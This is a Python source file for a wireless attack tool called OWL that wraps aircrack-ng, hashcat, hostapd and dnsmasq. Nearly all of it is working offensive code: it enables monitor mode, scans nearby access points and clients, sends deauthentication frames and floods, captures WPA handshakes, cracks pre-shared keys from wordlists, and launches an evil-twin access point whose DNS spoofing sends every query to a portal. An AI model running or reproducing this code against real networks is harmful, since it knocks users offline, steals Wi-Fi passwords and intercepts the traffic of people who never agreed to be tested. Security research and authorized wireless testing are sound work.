"""
╔══════════════════════════════════════════════════════════════╗
║  OWL — Offensive WiFi Launcher                               ║
║  Live Mode Engine — Real hardware backend                    ║
║  Created by Sharon Anil                                      ║
╚══════════════════════════════════════════════════════════════╝

Wraps real Linux wireless tools: airmon-ng, aireplay-ng,
airodump-ng, hostapd, dnsmasq, hashcat, aircrack-ng.
All ops are guarded by platform + privilege checks.
"""

from __future__ import annotations
import asyncio
import os
import platform
import shutil
import subprocess
import sys
import time
from pathlib import Path
from typing import AsyncIterator, Callable

# ─── Platform guards ─────────────────────────────────────────────────────────

IS_LINUX   = platform.system() == "Linux"
IS_ROOT    = (os.geteuid() == 0) if IS_LINUX else False
TOOLS = [
    "airmon-ng", "aireplay-ng", "airodump-ng",
    "iwconfig", "iw", "ip",
]
OPTIONAL_TOOLS = ["hashcat", "aircrack-ng", "hostapd", "dnsmasq", "hcxdumptool"]


def check_live_available() -> dict:
    """Return dict of tool availability."""
    result = {
        "platform_ok": IS_LINUX,
        "root_ok": IS_ROOT,
        "tools": {},
        "optional": {},
        "live_ready": False,
    }
    for t in TOOLS:
        result["tools"][t] = shutil.which(t) is not None
    for t in OPTIONAL_TOOLS:
        result["optional"][t] = shutil.which(t) is not None
    result["live_ready"] = (
        IS_LINUX and IS_ROOT and all(result["tools"].values())
    )
    return result


def get_wireless_interfaces() -> list[str]:
    """List available wireless interfaces using iw, sysfs, and net utils."""
    if not IS_LINUX:
        return []
    ifaces: list[str] = []
    if shutil.which("iw"):
        try:
            out = subprocess.check_output(
                ["iw", "dev"], stderr=subprocess.DEVNULL, text=True, timeout=2.0
            )
            for line in out.splitlines():
                line = line.strip()
                if line.startswith("Interface "):
                    ifaces.append(line.split()[-1])
        except Exception:
            pass

    # Fall back / augment with sysfs checks
    try:
        import lib.net_utils as net
        for i in net.list_wifi_interfaces():
            if i not in ifaces:
                ifaces.append(i)
    except Exception:
        pass

    return ifaces


def get_interface_mode(iface: str) -> str:
    """Return monitor / managed / unknown using multi-method detection."""
    if not IS_LINUX:
        return "unknown"

    # Method 1: Check /sys/class/net/<iface>/type
    # ARPHRD_IEEE80211_RADIOTAP = 803, ARPHRD_IEEE80211_PRISM = 802
    try:
        type_path = Path(f"/sys/class/net/{iface}/type")
        if type_path.exists():
            val = type_path.read_text().strip()
            if val in ("802", "803"):
                return "monitor"
    except Exception:
        pass

    # Method 2: iw dev <iface> info
    if shutil.which("iw"):
        try:
            out = subprocess.check_output(
                ["iw", "dev", iface, "info"],
                stderr=subprocess.DEVNULL, text=True, timeout=2.0
            )
            for line in out.splitlines():
                line_s = line.strip()
                if line_s.startswith("type "):
                    m = line_s.split()[-1].lower()
                    if m in ("monitor", "managed"):
                        return m
        except Exception:
            pass

    # Method 3: iwconfig <iface> (essential for Realtek 8812au, 8821cu, etc.)
    if shutil.which("iwconfig"):
        try:
            out = subprocess.check_output(
                ["iwconfig", iface],
                stderr=subprocess.DEVNULL, text=True, timeout=2.0
            )
            m = _re.search(r"Mode:(\w+)", out, _re.IGNORECASE)
            if m:
                return m.group(1).lower()
        except Exception:
            pass

    return "unknown"


# ─── Monitor mode helpers ────────────────────────────────────────────────────

async def enable_monitor_mode(
    iface: str, callback: Callable[[str, str], None]
) -> str | None:
    """Enable monitor mode using airmon-ng with multi-layer fallback.
    Returns the active monitor interface name (or iface).
    """
    if not IS_LINUX or not IS_ROOT:
        callback("warn", "[!] Live mode requires Linux running as root.")
        return None

    # Check if already in monitor mode
    cur_mode = get_interface_mode(iface)
    if cur_mode == "monitor":
        callback("green", f"[+] Interface '{iface}' is already in monitor mode.")
        return iface

    callback("cyan", f"[*] Preparing '{iface}' for monitor mode...")

    # Step 1: Kill interfering background processes (NetworkManager, wpa_supplicant)
    if shutil.which("airmon-ng"):
        callback("dim", "    Killing interfering processes (airmon-ng check kill)...")
        await _run_cmd(["airmon-ng", "check", "kill"], callback, ignore_errors=True, timeout=8.0)

    # Record interfaces present beforehand
    before_ifaces = set(get_wireless_interfaces())

    # Step 2: Try airmon-ng start
    if shutil.which("airmon-ng"):
        callback("cyan", f"[*] Running: airmon-ng start {iface}...")
        await _run_cmd(["airmon-ng", "start", iface], callback, ignore_errors=True, timeout=10.0)

    # Check if the original interface is now in monitor mode
    if get_interface_mode(iface) == "monitor":
        callback("green", f"[+] Monitor mode active on '{iface}'.")
        return iface

    # Check if a new interface was spawned (e.g. wlan0mon, wlx...mon)
    after_ifaces = set(get_wireless_interfaces())
    candidates = list(after_ifaces - before_ifaces) + [f"{iface}mon", "wlan0mon", "wlan1mon"]
    for cand in candidates:
        if cand in after_ifaces and get_interface_mode(cand) == "monitor":
            callback("green", f"[+] Monitor mode active on new interface '{cand}'.")
            return cand

    # Step 3: Fallback A — direct iw link change
    if shutil.which("iw") and shutil.which("ip"):
        callback("dim", f"    Fallback: ip link set {iface} down && iw dev {iface} set type monitor...")
        await _run_cmd(["ip", "link", "set", iface, "down"], callback, ignore_errors=True, timeout=4.0)
        await _run_cmd(["iw", "dev", iface, "set", "type", "monitor"], callback, ignore_errors=True, timeout=4.0)
        await _run_cmd(["ip", "link", "set", iface, "up"], callback, ignore_errors=True, timeout=4.0)
        if get_interface_mode(iface) == "monitor":
            callback("green", f"[+] Monitor mode active on '{iface}'.")
            return iface

    # Step 4: Fallback B — iwconfig mode monitor (for Realtek drivers)
    if shutil.which("iwconfig") and shutil.which("ip"):
        callback("dim", f"    Fallback: iwconfig {iface} mode monitor...")
        await _run_cmd(["ip", "link", "set", iface, "down"], callback, ignore_errors=True, timeout=4.0)
        await _run_cmd(["iwconfig", iface, "mode", "monitor"], callback, ignore_errors=True, timeout=4.0)
        await _run_cmd(["ip", "link", "set", iface, "up"], callback, ignore_errors=True, timeout=4.0)
        if get_interface_mode(iface) == "monitor":
            callback("green", f"[+] Monitor mode active on '{iface}'.")
            return iface

    # Step 5: Final scan of all wireless interfaces
    for cand in get_wireless_interfaces():
        if get_interface_mode(cand) == "monitor":
            callback("green", f"[+] Monitor interface found: '{cand}'.")
            return cand

    callback("warn", f"[!] Could not confirm monitor mode for '{iface}'.")
    callback("dim", "    Proceeding anyway — some Realtek drivers operate in monitor mode without reporting it.")
    return iface


async def disable_monitor_mode(
    iface: str, callback: Callable[[str, str], None]
) -> None:
    """Restore managed mode."""
    if not IS_LINUX or not IS_ROOT:
        return
    callback("cyan", f"[*] Stopping monitor mode on {iface}...")
    if shutil.which("airmon-ng"):
        await _run_cmd(["airmon-ng", "stop", iface], callback, ignore_errors=True, timeout=8.0)
    if shutil.which("ip"):
        await _run_cmd(["ip", "link", "set", iface, "down"], callback, ignore_errors=True, timeout=3.0)
        if shutil.which("iw"):
            await _run_cmd(["iw", "dev", iface, "set", "type", "managed"], callback, ignore_errors=True, timeout=3.0)
        elif shutil.which("iwconfig"):
            await _run_cmd(["iwconfig", iface, "mode", "managed"], callback, ignore_errors=True, timeout=3.0)
        await _run_cmd(["ip", "link", "set", iface, "up"], callback, ignore_errors=True, timeout=3.0)

    callback("green", f"[+] Interface '{iface}' restored.")
    if shutil.which("systemctl"):
        await _run_cmd(
            ["systemctl", "restart", "NetworkManager"],
            callback, ignore_errors=True, timeout=8.0
        )
        callback("green", "[+] NetworkManager restarted.")


# ─── RECON ───────────────────────────────────────────────────────────────────

import re as _re

def _strip_ansi(s: str) -> str:
    """Remove ANSI escape sequences from a string."""
    return _re.sub(r'\x1b\[[0-9;]*[mGKHF]', '', s).strip()


def parse_airodump_csv(csv_path: Path) -> tuple[list[dict], list[dict]]:
    """Parse airodump-ng CSV into (aps, clients), deduplicated by BSSID/MAC."""
    aps_by_bssid: dict[str, dict] = {}
    clients_by_mac: dict[str, dict] = {}
    try:
        text = csv_path.read_text(errors="replace")
        lines = text.replace("\r\n", "\n").replace("\r", "\n").splitlines()

        section = "aps"
        for raw_line in lines:
            line = _strip_ansi(raw_line).strip()
            if not line:
                continue

            # Switch sections on header markers
            if "Station MAC" in line or "Station-MAC" in line:
                section = "clients"
                continue
            if "BSSID" in line and "First time seen" in line:
                section = "aps"
                continue

            parts = [p.strip() for p in line.split(",")]

            if section == "aps":
                if len(parts) < 14:
                    continue
                bssid = parts[0].strip()
                if not _re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', bssid):
                    continue

                sig_str = parts[8].strip()
                signal = int(sig_str) if sig_str.lstrip("-").isdigit() else -999

                ssid = parts[13].strip() if len(parts) > 13 else ""
                channel = parts[3].strip() if len(parts) > 3 else ""
                enc = parts[5].strip() if len(parts) > 5 else ""

                if bssid not in aps_by_bssid or signal > aps_by_bssid[bssid]["_sig"]:
                    aps_by_bssid[bssid] = {
                        "bssid":   bssid,
                        "channel": channel,
                        "signal":  f"{sig_str} dBm" if sig_str else "—",
                        "enc":     enc,
                        "ssid":    ssid or "<hidden>",
                        "pmf":     "Unknown",
                        "clients": 0,
                        "wids":    False,
                        "vendor":  "",
                        "_sig":    signal,
                    }

            elif section == "clients":
                if len(parts) < 6:
                    continue
                mac = parts[0].strip()
                if not _re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', mac):
                    continue
                parent_bssid = parts[5].strip() if len(parts) > 5 else ""
                if mac not in clients_by_mac:
                    clients_by_mac[mac] = {
                        "mac":       mac,
                        "bssid":     parent_bssid if parent_bssid and parent_bssid != "(not associated)" else "—",
                        "signal":    f"{parts[3].strip()} dBm" if parts[3].strip() else "—",
                        "channel":   "—",
                        "vendor":    "",
                        "frames":    parts[4].strip() if len(parts) > 4 else "0",
                        "last_seen": parts[2].strip() if len(parts) > 2 else "—",
                    }
                # Track client count on AP
                if parent_bssid and parent_bssid in aps_by_bssid:
                    aps_by_bssid[parent_bssid]["clients"] += 1

    except Exception:
        pass

    aps = [{k: v for k, v in ap.items() if k != "_sig"} for ap in aps_by_bssid.values()]
    clients = list(clients_by_mac.values())
    return aps, clients


async def live_airodump_scan(
    iface: str,
    duration: int,
    callback: Callable[[str, str], None],
    on_progress: Callable[[list[dict], list[dict], int, int], None] | None = None,
    output_prefix: str = "/tmp/owl_recon",
    channel: str = "0",
    bssid: str = "",
    stop_event: asyncio.Event | None = None,
) -> tuple[list[dict], list[dict], Path | None]:
    """Run real-time airodump-ng scan.

    Updates on_progress every second so the UI is responsive.
    Returns (aps, clients, csv_path).
    """
    if not IS_LINUX or not IS_ROOT:
        callback("warn", "[!] Live scan requires Linux running as root.")
        return [], [], None

    mode = get_interface_mode(iface)
    if mode == "managed":
        callback("warn",
            f"[!] '{iface}' is in managed mode. "
            "If scan returns 0 APs, click ENABLE MON first."
        )

    # Clean leftover files
    for old in Path("/tmp").glob(f"{Path(output_prefix).name}*"):
        try:
            old.unlink()
        except Exception:
            pass

    csv_path = Path(f"{output_prefix}-01.csv")
    cmd = [
        "airodump-ng",
        "--output-format", "csv",
        "--write", output_prefix,
        "--write-interval", "1",
    ]
    if channel and str(channel).strip() not in ("0", ""):
        cmd.extend(["--channel", str(channel).strip()])
    if bssid and bssid.strip():
        cmd.extend(["--bssid", bssid.strip()])
    cmd.append(iface)

    callback("cyan", f"[*] Running airodump-ng on {iface} (duration: {duration}s)...")
    proc = None
    aps: list[dict] = []
    clients: list[dict] = []

    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdin=asyncio.subprocess.DEVNULL,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.PIPE,
        )

        for sec in range(1, duration + 1):
            if stop_event and stop_event.is_set():
                callback("yellow", f"[!] Scan stopped by user at {sec}s.")
                break

            # Check if process died prematurely
            if proc.returncode is not None:
                err_text = ""
                try:
                    raw_err = await asyncio.wait_for(proc.stderr.read(), timeout=1.0)
                    err_text = raw_err.decode(errors="replace").strip()
                except Exception:
                    pass
                callback("error", f"[✗] airodump-ng exited ({proc.returncode}): {err_text or 'Check if interface is up.'}")
                break

            await asyncio.sleep(1)

            # Live parse intermediate CSV
            if csv_path.exists() and csv_path.stat().st_size > 0:
                aps, clients = parse_airodump_csv(csv_path)
                if on_progress:
                    try:
                        on_progress(aps, clients, sec, duration - sec)
                    except Exception:
                        pass

    except Exception as e:
        callback("error", f"[✗] Scan exception: {e}")
    finally:
        if proc:
            try:
                proc.terminate()
            except Exception:
                pass
            try:
                await asyncio.wait_for(proc.wait(), timeout=2.0)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass

    # Final parse
    if csv_path.exists() and csv_path.stat().st_size > 0:
        aps, clients = parse_airodump_csv(csv_path)
        callback("green", f"[+] Scan complete: {len(aps)} APs, {len(clients)} clients.")
        return aps, clients, csv_path
    else:
        if not (stop_event and stop_event.is_set()):
            callback("warn",
                f"[!] 0 APs captured. Verify that '{iface}' is in monitor mode "
                "(click ENABLE MON) and Wi-Fi networks are in range."
            )
        return aps, clients, None



# ─── DEAUTH ──────────────────────────────────────────────────────────────────

async def live_deauth(
    iface: str,
    bssid: str,
    client: str,
    count: int,
    reason: str,
    callback: Callable[[str, str], None],
) -> None:
    """Send real deauth frames via aireplay-ng."""
    if not IS_LINUX or not IS_ROOT:
        callback("warn", "[!] Live deauth requires Linux + root.")
        return

    reason_int = int(reason, 16) if reason.startswith("0x") else int(reason)
    cmd = [
        "aireplay-ng",
        "--deauth", str(count),
        "-a", bssid,
        "--reason", str(reason_int),
    ]
    if client and client not in ("FF:FF:FF:FF:FF:FF", "", "broadcast"):
        cmd += ["-c", client]
    cmd.append(iface)

    callback("cyan", f"[*] Running: {' '.join(cmd)}")
    await _run_cmd(cmd, callback)


# ─── FLOOD ───────────────────────────────────────────────────────────────────

async def live_flood(
    iface: str,
    bssid: str,
    total: int,
    burst: int,
    callback: Callable[[str, str], None],
    stop_event: asyncio.Event | None = None,
) -> None:
    """Flood using repeated aireplay-ng -0 calls."""
    if not IS_LINUX or not IS_ROOT:
        callback("warn", "[!] Live flood requires Linux + root.")
        return

    sent = 0
    while True:
        if stop_event and stop_event.is_set():
            break
        if total > 0 and sent >= total:
            break
        batch = min(burst, total - sent) if total > 0 else burst
        cmd = [
            "aireplay-ng", "--deauth", str(batch),
            "-a", bssid, iface
        ]
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        await proc.wait()
        sent += batch
        callback("magenta", f"[FLOOD] Sent {sent} frames to {bssid}")
        await asyncio.sleep(0.1)

    callback("red", f"[!!!] FLOOD COMPLETE — {sent} frames sent.")


# ─── HARVEST ─────────────────────────────────────────────────────────────────

async def live_harvest(
    iface: str,
    bssid: str,
    channel: int,
    output_dir: str,
    callback: Callable[[str, str], None],
    stop_event: asyncio.Event | None = None,
) -> Path | None:
    """Capture handshake via airodump-ng on specific channel/BSSID."""
    if not IS_LINUX or not IS_ROOT:
        callback("warn", "[!] Live harvest requires Linux + root.")
        return None

    Path(output_dir).mkdir(parents=True, exist_ok=True)
    prefix = str(Path(output_dir) / f"owl_cap_{bssid.replace(':', '')}")
    cmd = [
        "airodump-ng",
        "-c", str(channel),
        "--bssid", bssid,
        "--output-format", "pcap,csv",
        "--write", prefix,
        iface,
    ]
    callback("cyan", f"[*] Starting handshake capture on ch{channel}, target {bssid}")
    callback("cyan", f"[*] Output: {prefix}.*")

    proc = await asyncio.create_subprocess_exec(
        *cmd,
        stdin=asyncio.subprocess.DEVNULL,
        stdout=asyncio.subprocess.DEVNULL,
        stderr=asyncio.subprocess.DEVNULL,
    )

    # Wait until stop or pcap appears with EAPOL
    cap_path = Path(prefix + "-01.cap")
    timeout = 300  # 5 min max
    elapsed = 0
    while elapsed < timeout:
        if stop_event and stop_event.is_set():
            break
        if cap_path.exists() and cap_path.stat().st_size > 1024:
            callback("green", "[+] Capture file growing — checking for handshake...")
            # Check with aircrack-ng
            r = subprocess.run(
                ["aircrack-ng", str(cap_path)],
                capture_output=True, text=True
            )
            if "WPA" in r.stdout and "handshake" in r.stdout.lower():
                callback("green", "[✓] 4-WAY HANDSHAKE CAPTURED!")
                proc.terminate()
                return cap_path
        await asyncio.sleep(3)
        elapsed += 3

    proc.terminate()
    await proc.wait()
    if cap_path.exists():
        callback("yellow", f"[!] Capture stopped. File: {cap_path}")
        return cap_path
    return None


async def live_crack_hashcat(
    cap_file: str,
    wordlist: str,
    callback: Callable[[str, str], None],
) -> str | None:
    """Crack captured handshake with hashcat."""
    if not shutil.which("hashcat"):
        callback("warn", "[!] hashcat not found. Install: sudo apt install hashcat")
        return None

    # Convert to hccapx if needed
    hc_file = cap_file.replace(".cap", ".hccapx")
    if shutil.which("hcxtools") or shutil.which("cap2hccapx"):
        tool = "cap2hccapx" if shutil.which("cap2hccapx") else "hcxtools"
        subprocess.run([tool, cap_file, hc_file], capture_output=True)

    target = hc_file if Path(hc_file).exists() else cap_file
    cmd = [
        "hashcat", "-m", "22000",
        target, wordlist,
        "--force", "--status", "--status-timer=5",
    ]
    callback("cyan", f"[*] Running hashcat on {target}...")
    psk = None
    proc = await asyncio.create_subprocess_exec(
        *cmd,
        stdin=asyncio.subprocess.DEVNULL,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT,
    )
    async for line in proc.stdout:
        line = line.decode(errors="replace").rstrip()
        if ":" in line and len(line.split(":")) > 4:
            psk = line.split(":")[-1].strip()
            callback("green", f"[✓] PSK CRACKED: \"{psk}\"")
            break
        elif "Progress" in line or "Speed" in line:
            callback("cyan", f"[*] {line.strip()}")
        elif "Exhausted" in line:
            callback("yellow", "[!] Wordlist exhausted — no PSK found.")
    await proc.wait()
    return psk


# ─── PORTAL ──────────────────────────────────────────────────────────────────

def generate_hostapd_conf(
    iface: str, ssid: str, channel: int = 6
) -> str:
    """Generate hostapd config for evil twin AP."""
    return f"""# OWL-PORTAL — hostapd config
# Created by Sharon Anil — For authorized use only.

interface={iface}
driver=nl80211
ssid={ssid}
channel={channel}
hw_mode=g
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wmm_enabled=0
"""


def generate_dnsmasq_conf(
    iface: str,
    gateway: str = "192.168.99.1",
    dhcp_start: str = "192.168.99.100",
    dhcp_end: str = "192.168.99.200",
    portal_ip: str = "192.168.99.1",
) -> str:
    """Generate dnsmasq config for captive portal redirect."""
    return f"""# OWL-PORTAL — dnsmasq config
interface={iface}
dhcp-range={dhcp_start},{dhcp_end},12h
dhcp-option=3,{gateway}
dhcp-option=6,{gateway}
server=8.8.8.8
log-queries
log-dhcp
listen-address={gateway}
bind-dynamic
address=/#/{portal_ip}
"""


async def start_evil_twin(
    iface: str,
    ssid: str,
    channel: int,
    callback: Callable[[str, str], None],
) -> list[asyncio.subprocess.Process]:
    """Start hostapd + dnsmasq for evil twin."""
    procs: list[asyncio.subprocess.Process] = []
    if not IS_LINUX or not IS_ROOT:
        callback("warn", "[!] Evil twin requires Linux + root.")
        return procs

    # Write configs
    hostapd_conf = "/tmp/owl_hostapd.conf"
    dnsmasq_conf = "/tmp/owl_dnsmasq.conf"
    Path(hostapd_conf).write_text(generate_hostapd_conf(iface, ssid, channel))
    Path(dnsmasq_conf).write_text(generate_dnsmasq_conf(iface))

    # Assign IP to interface
    await _run_cmd(["ip", "addr", "flush", "dev", iface], callback, ignore_errors=True)
    await _run_cmd(["ip", "addr", "add", "192.168.99.1/24", "dev", iface], callback)
    await _run_cmd(["ip", "link", "set", iface, "up"], callback)

    callback("cyan", f"[*] Starting hostapd on {iface} — SSID: {ssid}")
    p1 = await asyncio.create_subprocess_exec(
        "hostapd", hostapd_conf,
        stdin=asyncio.subprocess.DEVNULL,
        stdout=asyncio.subprocess.DEVNULL,
        stderr=asyncio.subprocess.DEVNULL,
    )
    procs.append(p1)
    await asyncio.sleep(1)

    callback("cyan", "[*] Starting dnsmasq (DHCP + DNS spoof)...")
    p2 = await asyncio.create_subprocess_exec(
        "dnsmasq", "-C", dnsmasq_conf, "--no-daemon",
        stdin=asyncio.subprocess.DEVNULL,
        stdout=asyncio.subprocess.DEVNULL,
        stderr=asyncio.subprocess.DEVNULL,
    )
    procs.append(p2)

    callback("green", f"[+] Evil twin LIVE: SSID=\"{ssid}\" on {iface} ch{channel}")
    callback("green", "[+] DHCP pool: 192.168.99.100 - 200")
    callback("green", "[+] DNS spoof: all queries → 192.168.99.1")
    return procs


# ─── Internal helpers ─────────────────────────────────────────────────────────

async def _run_cmd(
    cmd: list[str],
    callback: Callable[[str, str], None],
    ignore_errors: bool = False,
    timeout: float = 15.0,
) -> int:
    """Run a command safely with DEVNULL stdin and timeout, stream output to callback."""
    proc = None
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdin=asyncio.subprocess.DEVNULL,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )

        async def _read_stream():
            async for raw in proc.stdout:
                line = raw.decode(errors="replace").rstrip()
                if line:
                    callback("dim", f"    {line}")

        try:
            await asyncio.wait_for(_read_stream(), timeout=timeout)
            rc = await asyncio.wait_for(proc.wait(), timeout=3.0)
        except asyncio.TimeoutError:
            try:
                proc.kill()
            except Exception:
                pass
            if not ignore_errors:
                callback("warn", f"[!] Command timed out ({timeout}s): {' '.join(cmd)}")
            return -1

        if rc != 0 and not ignore_errors:
            callback("error", f"[✗] Command exited {rc}: {' '.join(cmd)}")
        return rc
    except FileNotFoundError:
        callback("error", f"[✗] Tool not found: {cmd[0]}")
        return 127
    except Exception as e:
        if proc:
            try:
                proc.kill()
            except Exception:
                pass
        callback("error", f"[✗] Exception: {e}")
        return 1


# ─── Evidence export ──────────────────────────────────────────────────────────

def export_evidence(state: dict, export_dir: str) -> str:
    """Export session log + captures to timestamped directory."""
    from datetime import datetime
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out = Path(export_dir) / f"owl_evidence_{ts}"
    out.mkdir(parents=True, exist_ok=True)

    # Write session log
    log_path = out / "sessions.json"
    import json
    log_path.write_text(json.dumps(state.get("sessions", []), indent=2))

    # Write captures list
    cap_path = out / "captures.json"
    cap_path.write_text(json.dumps(state.get("captures", []), indent=2))

    return str(out)
